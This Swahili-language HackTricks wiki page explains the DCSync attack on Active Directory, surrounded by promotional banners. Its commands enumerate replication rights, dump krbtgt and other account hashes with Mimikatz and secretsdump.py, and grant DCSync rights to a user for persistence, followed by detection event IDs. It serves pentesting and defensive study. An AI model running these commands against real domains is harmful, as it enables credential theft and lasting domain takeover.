# DCSync

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia workflows** kwa kutumia zana za **jamii ya juu zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## DCSync

Ruhusa ya **DCSync** inamaanisha kuwa na ruhusa hizi juu ya kikoa lenyewe: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** na **Replicating Directory Changes In Filtered Set**.

**Maelezo Muhimu kuhusu DCSync:**

* Shambulio la **DCSync linaiga tabia ya Domain Controller na kuomba Domain Controllers zingine kureplika habari** kwa kutumia Itifaki ya Huduma ya Mbali ya Replication ya Direktori (MS-DRSR). Kwa kuwa MS-DRSR ni kazi halali na muhimu ya Active Directory, haiwezi kuzimwa au kulemazwa.
* Kwa chaguo-msingi, tu **Domain Admins, Enterprise Admins, Administrators, na Domain Controllers** wana vikundi vya lazima.
* Ikiwa nywila za akaunti zimehifadhiwa kwa encryption inayoweza kurejeshwa, chaguo lipo katika Mimikatz kurudisha nywila kwa maandishi wazi

### Uchambuzi

Angalia ni nani mwenye ruhusa hizi kutumia `powerview`:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Tumia Kisiasa
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Tumia Kijijini
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` inazalisha faili 3:

* moja na **hashes za NTLM**
* moja na **funguo za Kerberos**
* moja na nywila wazi kutoka kwa NTDS kwa akaunti yoyote iliyo na [**ufungaji wa kurudishwa**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) kuwezeshwa. Unaweza kupata watumiaji wenye ufungaji wa kurudishwa kwa kutumia

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Uthabiti

Ikiwa wewe ni msimamizi wa kikoa, unaweza kutoa ruhusa hii kwa mtumiaji yeyote kwa msaada wa `powerview`:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Kisha, unaweza **kuangalia ikiwa mtumiaji amepewa kwa usahihi** ruhusa hizo 3 kwa kuzitafuta kwenye matokeo ya (unapaswa kuweza kuona majina ya ruhusa hizo ndani ya uga wa "ObjectType"):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Kupunguza Hatari

* Usalama wa Tukio la Kitambulisho cha 4662 (Sera ya Ukaguzi kwa kitu lazima iwe imewezeshwa) - Operesheni ilifanywa kwenye kitu
* Usalama wa Tukio la Kitambulisho cha 5136 (Sera ya Ukaguzi kwa kitu lazima iwe imewezeshwa) - Kitu cha huduma ya saraka kilibadilishwa
* Usalama wa Tukio la Kitambulisho cha 4670 (Sera ya Ukaguzi kwa kitu lazima iwe imewezeshwa) - Ruhusa kwenye kitu zilibadilishwa
* AD ACL Scanner - Unda na linganisha ripoti za ACL. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Marejeo

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia kiotomatiki** mifumo ya kazi inayotumia zana za jamii za **juu zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
